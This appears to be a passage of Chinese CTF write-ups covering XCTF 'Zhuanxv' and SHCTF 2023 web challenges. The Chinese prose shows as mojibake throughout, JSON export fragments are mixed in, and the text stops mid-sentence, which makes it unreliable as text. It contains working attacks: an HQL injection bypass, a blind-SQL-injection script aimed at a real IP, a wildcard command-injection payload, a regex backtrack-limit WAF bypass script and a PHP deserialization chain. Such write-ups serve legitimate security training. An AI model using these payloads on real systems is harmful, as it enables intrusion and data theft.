å†¥å†¥ä¹‹ä¸­è®¤ä¸ºè¿™ä¼¼ä¹ä¼šè”ç³»åˆ°sqlæ³¨å…¥ï¼Œä½†å°è±¡ä¸­javaçš„sqlæ³¨å…¥å¾ˆéš¾ï¼Œæ¯•ç«Ÿæœ‰jdbcçš„é¢„ç¼–è¯‘ æ­¤å¤„å‚è€ƒç½‘ä¸Šå¤§ä½¬çš„wpï¼Œä¸Šé¢å›¾çš„sqlè¯­å¥ä½¿ç”¨HSQLï¼Œå› æ­¤æ„é€ ç™»å½•è´¦å·å¯†ç ï¼š from User where name ='admin' or '1'&gt;'0' or name like 'admin' and password = '\" + password + \"' UserServiceImpl.classåç¼–è¯‘åä»£ç ä¸­æ˜¯å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤ï¼Œè€Œsqlä¸­å¯¹å›è½¦è‡ªåŠ¨è¿‡æ»¤ï¼Œ å› æ­¤æˆ‘ä»¬å¯ä»¥å°†ç©ºæ ¼å­—ç¬¦æ¢æˆ%0Aï¼ˆasciiç è¡¨ç¤ºæ¢è¡Œç¬¦ï¼‰ã€‚äºæ˜¯ä½¿ç”¨hackbarè¿›è¡Œç¿»è¯‘ï¼Œå¾—åˆ°æ–°çš„æ³¨å…¥sqlçš„payloadï¼š admin'%0Aor%0A'1'&gt;'0'%0Aor%0Aname%0Alike%0A'admin å› æ­¤ç”¨æˆ·åï¼šadminâ€™%0Aor%0Aâ€™1â€™&gt;â€˜0â€™%0Aor%0Aname%0Alike%0Aâ€™admin å¯†ç ï¼š123ï¼ˆéšä¾¿ï¼‰ æ³¨æ„ä¸€å®šè¦ä½¿ç”¨hackbarè¿›è¡Œç™»å½•ï¼Œç”¨ä¸»é¡µç™»å½•æ²¡æœ‰ååº”ï¼Œå¦‚å›¾ï¼š ä½†è¿™ä¸ªé¡µé¢ä¼¼ä¹ä»€ä¹ˆä¹Ÿç‚¹å‡»ä¸äº†ï¼Œä¹‹åå°±å¼€å§‹å†™è„šæœ¬äº† import requests s=requests.session() flag='' for i in range(1,50): p='' for j in range(1,255): # (select ascii(substr(id, \"+str(i)+\", 1)) from Flag where id &lt; 2) &lt; ' payload = \"(select%0Aascii(substr(id,\"+str(i)+\",1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;'\"+str(j)+\"'\" #print payload url=\"http://111.200.241.244:57001/zhuanxvlogin?user.name=admin'%0Aor%0A\"+payload+\"%0Aor%0Aname%0Alike%0A'admin&amp;user.password=1\" r1=s.get(url) if len(r1.text)&gt;20000 and p!='': flag+=p print(i,flag) break p=chr(j) è¿™é‡Œå¯ä»¥çˆ†å‡ºflag åšäº†è¿™é“é¢˜å‘ç°å¾ˆå¤šçŸ¥è¯†éƒ½ä¸æ¸…æ¥šçš„ï¼Œæ„Ÿè§‰ä¸ç†Ÿæ‚‰Javaå’Œxmlä»£ç ç»“æ„ï¼Œå¾ˆéš¾çœ‹æ‡‚ï¼Œäº¦æˆ–è®¸æˆ‘å¤ªèœäº†ã€‚ä¸è¿‡ä¸‹è½½ä¹‹åå¾—é’ˆå¯¹æœ¬ç¯‡æ–‡ç« å­¦ä¹ ä¸€äº›å°çŸ¥è¯†äº†ï¼šstruct2æ¡†æ¶åŸºæœ¬ä¿¡æ¯ã€HSQLè¯­å¥ä»¥åŠåœ¨ç†Ÿæ‚‰ä¸€ä¸‹xmlç»“æ„ã€‚æ€»ä¹‹ï¼Œè¿™ç¯‡æ–‡ç« å€¼å¾—åå¤è§‚çœ‹ã€‚ å‚è€ƒæ–‡ç«  mysqlä¸‡èƒ½å¯†é’¥_æ”»é˜²ä¸–ç•Œ-web-Zhuanxvï¼ˆä»»æ„æ–‡ä»¶è¯»å–ã€ä¸‡èƒ½å¯†é’¥ã€sqlç›²æ³¨ ï¼‰ xctfæ”»é˜²ä¸–ç•Œ Webé«˜æ‰‹è¿›é˜¶åŒº Zhuanxv","categories":["æ”»é˜²ä¸–ç•Œ"]},{"title":"SHCTF 2023-wp","path":"/2023/10/02/2023shctf/","content":"0x01 å‰è¨€ æœ€è¿‘æ–°ç”Ÿæ¯”èµ›å¤ªå¤šäº†ï¼Œä¸€æ‰“å¼€å…¨æ˜¯webé¢˜ï¼Œçœ‹ç€å°±çˆ½(bushiï¼Œåšä¸‹æ¥ä¹‹åå‘ç°ä¸€ç‚¹éƒ½ä¸æ–°ç”Ÿâ”­â”®ï¹â”­â”®ï¼Œå¯èƒ½æ˜¯æˆ‘å¤ªèœäº†ã€‚ä½†æ€»ä½“ä¸‹æ¥æ„Ÿè§‰æ¯ä¸ªèµ›äº‹éƒ½è¿˜ä¸é”™ï¼Œè¦è¯´æœ€æœ‰éš¾åº¦çš„è¿˜æ˜¯moectfäº†ï¼Œå¾ˆçƒ¦ã€‚ä½†æ€»ä½“ä½“éªŒä¸‹æ¥è¿˜æ˜¯SHCTFèˆ’æœï¼Œå¹³å°ç»šä¸½ã€ä½“éªŒæ„Ÿä¹Ÿè´¼å¥½ç­‰ç­‰ï¼ˆåæ­£å„ç§èˆ’æœå§ï¼‰ï¼Œæ›´ä½•å†µè¿˜æ˜¯\"å±±æ²³CTF\"ï¼Œæˆ‘å°±æ˜¯å±±æ²³äººå•Šâ”­â”®ï¹â”­â”®ã€‚è¯ä¸å¤šè¯´å¼€å§‹å†™wp 0x02 ç©è½¬é¢˜ç›® å…ˆä»æœ€ç®€å•çš„å¼€å§‹å§ WEB [WEEK1]é£æœºå¤§æˆ˜ é¦–å…ˆä¾æ—§æ˜¯äº²åˆ‡æ— æ¯”çš„æ¸¸æˆï¼Œæˆ‘ä»¬å…ˆç‚¹å¼€çœ‹çœ‹ å—¯~~ï¼Œéå¸¸ç†Ÿæ‚‰çš„å˜²è®½ï¼Œé‚£æˆ‘ä»¬æŒ‰ç…§å¸¸è§„æ€è·¯ç›´æ¥å®¡è®¡ä¸€ä¸‹ç›¸å…³jsä»£ç ï¼Œè¿›æ§åˆ¶å°æŸ¥æ‰¾ è¿›å»çš„æ—¶å€™çœ‹åˆ°æ•æ„Ÿå­—ç¬¦scoreï¼Œé‚£çŒœæµ‹åº”è¯¥æ˜¯ä¿®æ”¹scoreä»¥è¾¾åˆ°è·å–flagï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¸ªscore è¿™é‡Œæ˜¯ä¸€äº›å¯¹scoreçš„åˆ¤æ–­ çœ‹åˆ°ä¸Šå›¾çš„æ—¶å€™å‘ç°æ˜¯å¯¹scoreè¾¾åˆ°è¦æ±‚çš„å‡½æ•°æ“ä½œï¼Œä½†ä¼¼ä¹æ²¡æœ‰ç”¨çš„ä¿¡æ¯ï¼Œäºæ˜¯æˆ‘å¢¨è¿¹äº†ä¸€ä¼šå„¿æƒ³åˆ°ï¼Œæ¸¸æˆå¤±è´¥ä¼šå¼¹çª—ï¼Œé‚£æˆåŠŸäº†å¤§æ¦‚ç‡ä¹Ÿæ˜¯å¼¹çª—ã€‚å‡­å€Ÿæ­¤æ€è·¯æˆ‘ä»¬å¯ä»¥æƒ³åˆ°æ˜¯å¦å¯ä»¥æ‰¾åˆ°å…³äº\"æ¸¸æˆèƒœåˆ©çš„å¤„ç†å‡½æ•°\"çœ‹çœ‹å†…éƒ¨æœ‰ä»€ä¹ˆä¿¡æ¯ï¼Œäºæ˜¯æˆ‘ç»§ç»­æ‰¾å‘ç°äº†wonå‡½æ•°ï¼ˆç±»ä¼¼winï¼šèƒœåˆ©ï¼‰ å¦‚å›¾å‘ç°alertå¼¹çª—å‡½æ•°ï¼Œä»¥åŠuniccodeç¼–ç å­—ç¬¦ä¸²ï¼Œé‚£æˆ‘ä»¬è§£ç ä¸€ä¸‹çœ‹çœ‹ å—¯ï¼äº²åˆ‡çš„base64ï¼Œè§£ç å³å¯å¾—åˆ°flag [WEEK1]babyRCE &lt;?php $rce = $_GET['rce']; if (isset($rce)) { if (!preg_match(\"/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\&gt;|\\&lt;|\\'|\\\"/i\", $rce)) { system($rce); }else { echo \"hhhhhhacker!!!\".\" \"; } } else { highlight_file(__FILE__); } å¾ˆæ˜æ˜¾çš„rceå˜›ï¼Œä½†æ˜¯è¿‡æ»¤äº†å¾ˆå¤šï¼Œè¿™é‡Œæˆ‘ä¹Ÿæ˜¯æ¯”è¾ƒèœè®°ä¸ä½é‚£ä¹ˆå¤šçŸ¥è¯†ç‚¹ï¼Œåªæ˜¯åœ¨é‡åˆ°çš„æ—¶å€™åœ¨ç½‘ä¸Šå†²æµªæ‰¾ç›¸å…³payloadï¼Œäºæ˜¯ä¹ç¿»åˆ°äº†å¦‚ä¸‹ï¼š []ä¸­æ‹¬å·åŒ¹é…ç»•è¿‡ ä¾‹å¦‚**[a-c]** ä»£è¡¨åŒ¹é… a-bä¹‹é—´çš„å­—ç¬¦,åŒ…æ‹¬a,bå­—ç¬¦æœ¬èº« åŒ¹é…èŒƒå›´ä¸ºå½“å‰ç›®å½•ï¼Œä¾‹å­å¦‚ä¸‹ /[a-c][h-j][m-o]/[b-d]a[s-u] flag.txt ç›¸å½“äº /bin/cat flag.txt å› ä¸º[]åŒ¹é…èŒƒå›´åªåœ¨å½“å‰è·¯å¾„ æ‰€ä»¥è¦ä¸ºbinç»å¯¹è·¯å¾„ ä¸€å®šè¦æ³¨æ„ç»å¯¹è·¯å¾„ï¼Œç›¸å¯¹è·¯å¾„æ˜¯ä¸å¯ä»¥çš„ï¼ éšåå‚è€ƒä¸Šè¿°å¯ä»¥æ„é€ å¦‚ä¸‹payloadï¼š /[a-c][h-j][m-o]/[b-d]a[s-u]${IFS}/fl?g ä¹Ÿå°±æ˜¯:/bin/cat flag;?:è¡¨ç¤ºé€šé…å­—ç¬¦0æˆ–,ä¹Ÿå°±æ˜¯å¯ä»¥åŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦ ${IFS}åœ¨linuxä¸­å¯ä»¥ä»£æ›¿ç©ºæ ¼ è¿™é‡Œé€‰/flagåŸå› æ˜¯é€šè¿‡æ„é€ ls${IFS}/å¾—åˆ°çš„ï¼Œåªè¾“å…¥lsä¹Ÿä¼šå‘ç°flag.phpï¼Œä¸è¿‡è¿™æ˜¯å‡çš„ [WEEK1]ç™»å½•å°±ç»™flag é¦–é¡µå¦‚ä¸‹ï¼Œè¿™é‡Œåªèƒ½åœ¨ç™»å½•é¡µé¢è½¬æ‚ ï¼Œæ²¡ä»€ä¹ˆä¿¡æ¯çš„ å½“æ—¶æˆ‘æƒ³å¤æ‚äº†ï¼Œå…ˆç”¨dirsearchæ‰«äº†æ‰«ï¼ŒåˆbpæŠ“åŒ…çœ‹äº†çœ‹ï¼Œä»€ä¹ˆä¹Ÿæ²¡å‘ç°ï¼Œæœ€åå°è¯•äº†ä¸‡èƒ½å¯†ç å’Œsqlæ³¨å…¥å‡æ— æœï¼Œæˆ‘ä»¥ä¸ºè¿™é“é¢˜å¾ˆéš¾çš„ï¼Œç»“æœä¸€ä½å¸ˆå‚…å‘Šè¯‰æˆ‘ç›´æ¥å¼±å£ä»¤å•Šï¼Œæˆ‘è¿˜çº³é—·å‘¢ï¼Œæˆ‘ä¹Ÿè¯•è¿‡å•Šï¼Œæ²¡è¿™ä¹ˆç®€å•å§ã€‚ä½†æˆ‘åˆæƒ³åˆ°æˆ‘å½“æ—¶åªæ˜¯å°è¯•äº†ä¸€ä¸‹ï¼Œéšåæˆ‘åˆå»å°è¯•ï¼Œå‘ç°çœŸçš„å¾ˆç®€å•ï¼š ç›´æ¥adminï¼špasswordå°±ç™»é™†è¿›å»äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ æ‹¿åˆ°flag [WEEK1]ç”Ÿæˆä½ çš„é‚€è¯·å‡½å§~ é¦–é¡µå¦‚ä¸‹ï¼Œå†ç»“åˆé¢˜ç›®ç»™çš„ä¿¡æ¯ï¼š APIï¼šurl/generate_invitation Requestï¼šPOST application/json Bodyï¼š{ \"name\": \"Yourname\", \"imgurl\": \"http://q.qlogo.cn/headimg_dl?dst_uin=QQnumb&amp;spec=640&amp;img_type=jpg\" } ä½¿ç”¨POST jsonè¯·æ±‚æ¥ç”Ÿæˆä½ çš„é‚€è¯·å‡½å§~flagå°±åœ¨é‡Œé¢å“¦~ å¾ˆæ˜¾ç„¶å°±æ˜¯æŠ“åŒ…ä¿®æ”¹ä¸ºä¸Šè¿°æ ¼å¼å³å¯ï¼Œä½†è¿™é‡Œæ³¨æ„ä¸å¿…æ”¾åˆ°repeaterç›´æ¥ä¿®æ”¹åæ”¾åŒ…å³å¯ï¼Œä¸ç„¶å‡ºæ¥çš„å›¾ç‰‡ä½ çœ‹ä¸åˆ°ï¼Œåªèƒ½æ˜¯ä¸€å †ä¹±ç  æ·»åŠ æŒ‡å®šurlåæŠ“åŒ…ä¿®æ”¹ æœªä¿®æ”¹å‰å¦‚ä¸Šå›¾ï¼›ä¿®æ”¹åå¦‚ä¸‹å›¾ï¼š ç›´æ¥æ”¾åŒ…å³å¯ æ”¾åŒ…ä¹‹åä¼šå‘ç°æµè§ˆå™¨è‡ªåŠ¨ä¸‹è½½äº†å›¾ç‰‡ ï¼Œè®¿é—®çœ‹åˆ°å¦‚ä¸‹å›¾flagï¼Œè¿™é‡Œæˆ‘æ˜¯å‘åˆ°äº†å¾®ä¿¡ç›´æ¥åˆ©ç”¨å¾®ä¿¡çš„è‡ªå¸¦å›¾ç‰‡æå–æ–‡å­—åŠŸèƒ½ï¼Œå¤§å®¶æœ‰åˆ«çš„åŠæ³•ä¹Ÿå¯ä»¥ [WEEK1]1zzphp &lt;?php error_reporting(0); highlight_file('./index.txt'); if(isset($_POST['c_ode']) &amp;&amp; isset($_GET['num']))//åˆ¤æ–­å‚æ•°æ˜¯å¦å­˜åœ¨ { $code = (String)$_POST['c_ode'];//å¼ºåˆ¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹åèµ‹å€¼ $num=$_GET['num'];//æ­£å¸¸èµ‹å€¼ if(preg_match(\"/[0-9]/\", $num))//æ­£åˆ™åŒ¹é… { die(\"no number!\"); } elseif(intval($num))//è½¬æ¢ä¸ºæ•´æ•°ç±»å‹ { if(preg_match('/.+?SHCTF/is', $code))//è¿˜æ˜¯æ­£åˆ™åŒ¹é… { die('no touch!'); } //æ‰¾å¯»codeå­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°æŒ‡å®šå­—ç¬¦ä¸²çš„ä½ç½® if(stripos($code,'2023SHCTF') === FALSE) { die('what do you want'); } echo $flag; } } emmmæœ‰éš¾åº¦çš„PHPç‰¹æ€§ï¼ˆåªæ€ªæˆ‘åˆ·å¤ªå°‘ï¼Œå¤ªèœäº†â”­â”®ï¹â”­â”®ï¼‰ è¿™é‡Œä¹Ÿæ˜¯åºŸäº†å¾ˆé•¿æ—¶é—´ï¼Œæœ€åä¹Ÿæ˜¯ç™¾åº¦æ‰¾åˆ°çš„æ€è·¯ é¦–å…ˆç¬¬ä¸€ä¸ªæ­£åˆ™çš„è¯ï¼Œåšé¢˜å¤šäº†å°±çŸ¥é“preg_matchå‡½æ•°çš„ç‰¹æ€§ï¼šä¸èƒ½å¤„ç†æ•°ç»„ç±»å‹ï¼ˆä¼šè¿”å›falseï¼‰ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å°†numèµ‹å€¼ä¸ºï¼šnum[]=1ï¼Œåœ¨ä¹‹åçš„intvalä½œç”¨ä¸‹ä¼šè½¬æ¢æˆ1ï¼Œå³å¯ç»•è¿‡ã€‚ ç¬¬äºŒä¸ªå‘¢æ˜¯æ­£åˆ™ä¸striposçš„é…åˆç»•è¿‡ï¼Œåˆ†æå¾—è¯¥æ­£åˆ™è¦æ±‚ä½ çš„codeå‚æ•°ä¸èƒ½ä¸ºSHCTFï¼Œä¸”SHCTFå‰é¢ä¸èƒ½æœ‰ä»»æ„å­—ç¬¦ï¼Œä½†åç»­çš„striposè¦æ±‚ä½ çš„codeå‚æ•°å¿…é¡»å«æœ‰2023SHCTFï¼Œæ‰€ä»¥è¿™é‡ŒèŠ±äº†æˆ‘å¾ˆé•¿æ—¶é—´ã€‚ åœ¨æ­¤æœŸé—´æˆ‘å°è¯•äº†æ•°ç»„ç­‰ç­‰ï¼Œä½†å‡æ— æœï¼Œä¹‹åç½‘ä¸Šæ¼«æ¸¸å‘ç°å¯ä»¥åˆ©ç”¨æ­£åˆ™æœ€å¤§å›æº¯ç»•è¿‡ã€‚é‚£æˆ‘ä»¬å…ˆæ¥å­¦ä¹ ä¸€ä¸‹è¯¥çŸ¥è¯†ç‚¹ï¼Œå…ˆæ”¾å‡ºå‚è€ƒæ–‡ç« ï¼š PHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ | ç¦»åˆ«æ­Œ è¿™ç¯‡æ–‡ç« å¾ˆé¡¶ï¼Œè§£é‡Šçš„æˆ‘éƒ½èƒ½çœ‹æ‡‚(^â–½^)ï¼Œä½†ç”±äºæˆ‘æ¦‚è¿°èƒ½åŠ›ä¸å¥½ï¼Œå°±ç»“åˆåˆ«äººçš„è¯è¯­æ¥é˜é‡Šï¼š â€‹ ç®€å•æ¥è¯´å°±æ˜¯æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ—¶å€™æŸä¸ª.*å°†åé¢çš„å­—ç¬¦å…¨éƒ¨åŒ¹é…åˆ°äº†ï¼Œå¯¼è‡´è¡¨è¾¾å¼åé¢çš„å¼å­æ²¡æœ‰åœ°æ–¹åŒ¹é…ï¼Œå› æ­¤ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦åå‡ºæ¥ï¼Œç›´åˆ°åé¢çš„å¼å­å…¨éƒ¨åŒ¹é…å®Œæ¯•æˆ–è€…å›æº¯æ¬¡æ•°è¿‡å¤šå¯¼è‡´æ­£åˆ™ç›´æ¥è¿”å›falseï¼šå½“ç„¶ä¸Šè¿°è¡¨è¿°çš„å‰æä¸‹æ˜¯è¦æ±‚æ­£åˆ™è¡¨è¾¾å¼å¤„äºéè´ªå©ªæ¨¡å¼æˆ–è€…NFAæ¨¡å¼ NFAæ¨¡å¼ï¼šä»èµ·å§‹çŠ¶æ€å¼€å§‹ï¼Œä¸€ä¸ªå­—ç¬¦ä¸€ä¸ªå­—ç¬¦åœ°è¯»å–è¾“å…¥ä¸²ï¼Œå¹¶ä¸æ­£åˆ™è¡¨è¾¾å¼è¿›è¡ŒåŒ¹é…ï¼Œå¦‚æœåŒ¹é…ä¸ä¸Šï¼Œåˆ™è¿›è¡Œå›æº¯ï¼Œå°è¯•å…¶ä»–çŠ¶æ€ï¼ˆæ‰€è°“çš„å›æº¯ä¹Ÿå°±æ˜¯åœ¨è¿”å›å‰é¢çš„å­—ç¬¦ä¸²è¿›è¡Œé‡æ–°åŒ¹é…ï¼Œç›´åˆ°æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å®Œå…¨ï¼‰ï¼Œå…·ä½“å¯å‚è€ƒä¸Šè¿°æ–‡ç« ã€‚ éè´ªå©ªæ¨¡å¼ï¼š if(preg_match('/UNION.+?SELECT/is', $input)) { die('SQL Injection'); } å¦‚åŒä¸Šè¿°è¡¨è¾¾å¼å¦‚æœæˆ‘è¾“å…¥è¯¥è¯­å¥ï¼šUNION/*aaaaa*/SELECTï¼Œè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š .+?åŒ¹é…åˆ°/ å› ä¸ºéè´ªå©ªæ¨¡å¼ï¼Œæ‰€ä»¥.+?åœæ­¢åŒ¹é…ï¼Œè€Œç”±SåŒ¹é…* SåŒ¹é…*å¤±è´¥ï¼Œå›æº¯ï¼Œå†ç”±.+?åŒ¹é…* å› ä¸ºéè´ªå©ªæ¨¡å¼ï¼Œæ‰€ä»¥.+?åœæ­¢åŒ¹é…ï¼Œè€Œç”±SåŒ¹é…a SåŒ¹é…aå¤±è´¥ï¼Œå›æº¯ï¼Œå†ç”±.+?åŒ¹é…a ... å›æº¯æ¬¡æ•°éšç€açš„æ•°é‡å¢åŠ è€Œå¢åŠ ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡å‘é€å¤§é‡aï¼Œæ¥ä½¿å›æº¯æ¬¡æ•°è¶…å‡ºpcre.backtrack_limité™åˆ¶ï¼Œè¿›è€Œç»•è¿‡WAFï¼š æ³¨æ„æ­£åˆ™åŒ¹é…ä¸­çš„ ^.*ã€.*$ã€.*å°±å¯ä»¥ä½¿ç”¨å›æº¯ï¼Œæ€ä¹ˆå›æº¯å‘¢ï¼Œåªèƒ½ä¸Šè„šæœ¬äº†ï¼Œå› ä¸ºä¸€ç™¾ä¸‡ä¸ªå­—ç¬¦ï¼Œæ€»ä¸å¯èƒ½æ‰‹å†™ã€‚æˆ‘è¿™é‡Œä¹Ÿæ˜¯é—®GPTå¾—åˆ°çš„è„šæœ¬ï¼Œå› ä¸ºæˆ‘èœç‹—ä¸ä¼šå†™â”­â”®ï¹â”­â”® import requests # å®šä¹‰ç›®æ ‡ URL url = 'http://112.6.51.212:30422/?num[]=1' # è¯·å°†æ­¤å¤„çš„ URL æ›¿æ¢ä¸ºä½ è¦è®¿é—®çš„å®é™… URL # POST è¯·æ±‚å‚æ•° prefix_a = 'a' * 1000000 post_params = {'c_ode': prefix_a + '2023SHCTF'} # å‘é€ POST è¯·æ±‚å¹¶è·å–å“åº” post_response = requests.post(url, data=post_params) # æ£€æŸ¥ POST è¯·æ±‚çš„å“åº” if post_response.status_code == 200: print(\"POST è¯·æ±‚æˆåŠŸ\") print(\"POST å“åº”å†…å®¹:\", post_response.text) else: print(\"POST è¯·æ±‚å¤±è´¥\") æ€è·¯å°±æ˜¯å¯¹è¯¥urlè¿›è¡Œè¯·æ±‚ï¼Œå¹¶ä¼ å…¥ç›¸åº”çš„getå’Œpostå‚æ•°ï¼Œä½†åœ¨2023SHCTFä¹‹å‰è¦åŠ å…¥ä¸€ç™¾ä¸‡ä¸ªå­—ç¬¦aï¼Œå³å¯ç»•è¿‡ æˆåŠŸæ‹¿åˆ°flag [WEEK1]ez_serialize &lt;?php highlight_file(__FILE__);//é«˜äº®ä»£ç  class A{ public $var_1; public function __invoke(){//éœ€è¦å½“å¯¹è±¡è¢«å½“æˆä¸€ä¸ªæ–¹æ³•(ä¹Ÿå°±æ˜¯å‡½æ•°)è°ƒç”¨æ—¶,invokeä¼šè‡ªåŠ¨è°ƒç”¨ include($this-&gt;var_1);//è¿™é‡Œä¸€çœ‹å°±çŸ¥é“æ˜¯æ•æ„Ÿå‡½æ•°ï¼Œå¤§æ¦‚æ˜¯ç”¨æ¥ä¼ªåè®®è¯»å–çš„ } } class B{ public $q; public function __wakeup()//å½“å¼€å§‹ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œwakeupä¼šè¢«è‡ªåŠ¨è°ƒç”¨ { if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;q)) { echo \"hacker\"; }//è™½ç„¶è¿™é‡Œçš„æ­£åˆ™è¿‡æ»¤çš„å¾ˆå¤šï¼Œä½†æ²¡å•¥ç”¨ï¼Œå¯ä»¥å¿½ç•¥ } } class C{ public $var; public $z; public function __toString(){//å½“ä¸€ä¸ªç±»è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ return $this-&gt;z-&gt;var; } } class D{ public $p; public function __get($key){//å½“è¯»å–ä¸å¯è®¿é—®çš„å±æ€§çš„å€¼æ—¶è°ƒç”¨ $function = $this-&gt;p; return $function(); } } if(isset($_GET['payload']))//ç®€å•çš„ä¼ å‚ { unserialize($_GET['payload']); } ?&gt; å¾ˆç®€å•çš„åºåˆ—åŒ–é¢˜ï¼Œç»“åˆä¸Šè¿°å¯¹ä»£ç çš„åˆ†ææˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹é“¾å­ï¼š é¦–å…ˆçœ‹å‡†æ•æ„Ÿå‡½æ•°includeï¼Œè¿™é‡Œè‚¯å®šæ˜¯ç”¨æ¥è¯»å–phpæ–‡ä»¶çš„ï¼Œé‚£è¿™ä¸ªå‡½æ•°è‚¯å®šæ˜¯æˆ‘ä»¬çš„ç›®æ ‡ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³è¦è°ƒç”¨invokeï¼Œå°±éœ€è¦Aå¯¹è±¡è¢«å½“åšä¸€ä¸ªå‡½æ•°å»è°ƒç”¨ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°Dç±»ä¸­çš„return $function();ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ã€‚ é‚£æƒ³è¦è°ƒç”¨å…¶æ‰€åœ¨çš„getå‡½æ•°ï¼Œå°±éœ€è¦è¯»å–ä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§ï¼Œé‚£æˆ‘ä»¬åˆå¯ä»¥çœ‹åˆ°return $this-&gt;z-&gt;var;å¾ˆæ˜æ˜¾å¦‚æœæˆ‘ä»¬ä»¤zæŒ‡å‘å¯¹è±¡Dï¼Œé‚£z-&gt;varç›¸å½“äºD-&gt;varï¼Œä½†å¾ˆæ˜¾ç„¶Dä¸­æ²¡æœ‰varå±æ€§ï¼Œé‚£ä¾¿æˆåŠŸè°ƒç”¨getå‡½æ•°äº†ã€‚ é‚£æˆ‘ä»¬æƒ³è¦è°ƒç”¨å…¶æ‰€åœ¨çš„tostringå‡½æ•°ï¼Œå°±éœ€è¦å½“ä¸€ä¸ªç±»è¢«å½“åšå­—ç¬¦ä¸²æ—¶ä¼šè°ƒç”¨ï¼Œé‚£æˆ‘ä»¬åˆå¯ä»¥å‘ç°wakeupé‡Œé¢çš„æ­£åˆ™åŒ¹é…ï¼Œå…¶ä¸­$this-&gt;qè¢«è®¤ä½œå­—ç¬¦ä¸²ï¼Œé‚£å®Œå…¨å¯ä»¥å°†qèµ‹å€¼ä¸ºCç±»ï¼Œå³å¯èµ°é€šé“¾å­ã€‚ è‡³äºwakeupçš„è°ƒç”¨ï¼Œååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæˆ‘ä»¬ä¸å¿…è€ƒè™‘ã€‚é‚£ä¹ˆpocå¦‚ä¸‹ï¼š &lt;?php //highlight_file(__FILE__); class A{ public $var_1; } class B{ public $q; } class C{ public $var; public $z; } class D{ public $p; } $poc = new B(); $poc-&gt;q = new C(); $poc-&gt;q-&gt;z=new D(); $poc-&gt;q-&gt;z-&gt;p=new A(); $poc-&gt;q-&gt;z-&gt;p-&gt;var_1='php://filter/convert.base64-encode/resource=flag.php'; echo urlencode(serialize($poc)); ?&gt; ç›´æ¥base64è§£ç å³å¯ å¾—åˆ°flag [WEEK1]ezphp &lt;?php error_reporting(0); if(isset($_GET['code']) &amp;&amp; isset($_POST['pattern'])) { $pattern=$_POST['pattern']; if(!preg_match(\"/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\\.|\\`|read*|show|file|\\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\\/| |\\?|mv|cp|next|show_source|highlight_file|glob|\\~|\\^|\\||\\&amp;|\\*|\\%/i\",$code)) { $code=$_GET['code']; preg_replace('/(' . $pattern . ')/ei','print_r(\"\\\\1\")', $code); echo \"you are smart\"; }else{ die(\"try again\"); } }else{ die(\"it is begin\"); } ?&gt; it is begin ä¸€çœ‹åˆ°è¿™è¿‡æ»¤çš„çœŸçš„æ˜¯å“åˆ°æˆ‘äº†ï¼Œä½†å¾€å¾€è¿™ä¹ˆå¯æ€•çš„æƒ…å†µä¸‹å°±ä¼šæœ‰bugï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸€ç•ªå‘ç°ï¼Œç«Ÿç„¶æ²¡è¿‡æ»¤ passthru()å‡½æ•°ï¼Œå¥½å¥½å¥½è¿™ä¹ˆç©æ˜¯å§~~~ è¿™ä¸ªå‡½æ•°ä¸systemç±»ä¼¼ï¼Œç”¨æ³•ä¹Ÿä¸€è‡´ã€‚é‡ç‚¹æ˜¯ preg_replace('/(' . $pattern . ')/ei','print_r(\"\\\\1\")', $code);æ­¤å¤„çš„ä»£ç æˆ‘ä»¬å¦‚ä½•çœ‹æ‡‚ æˆ‘è¿™é‡Œä¹Ÿæ˜¯çœ‹ä¸æ‡‚ï¼Œäºæ˜¯é€‰æ‹©ç½‘ä¸Šå†²æµªçœ‹çœ‹æœ‰æœºä¼šæ²¡æœ‰ï¼Œç»“æœè¿˜çœŸæœ‰ç±»ä¼¼çš„^_^ï¼Œä¸‹é¢æˆ‘å°±è·Ÿç€é‚£äº›ä½¬çš„æ€è·¯å­¦ä¹ ä¸€ä¸‹ã€‚ å…ˆä»‹ç»ä¸€ä¸ªPHPç‰¹æ€§å§ï¼š phpè‡ªèº«åœ¨è§£æè¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœå‚æ•°åå­—ä¸­åŒ…å«ç©ºæ ¼ã€.ã€[ç­‰å­—ç¬¦ï¼Œä¼šå°†ä»–ä»¬è½¬æ¢æˆ_ã€‚ $a = $_GET; var_dump($a); ?&gt; é¦–å…ˆæˆ‘ä»¬çŸ¥é“ preg_replace çš„ /e ä¿®æ­£ç¬¦ä¼šå°† replacement å‚æ•°å½“ä½œ php ä»£ç ï¼Œå¹¶ä¸”ä»¥ eval 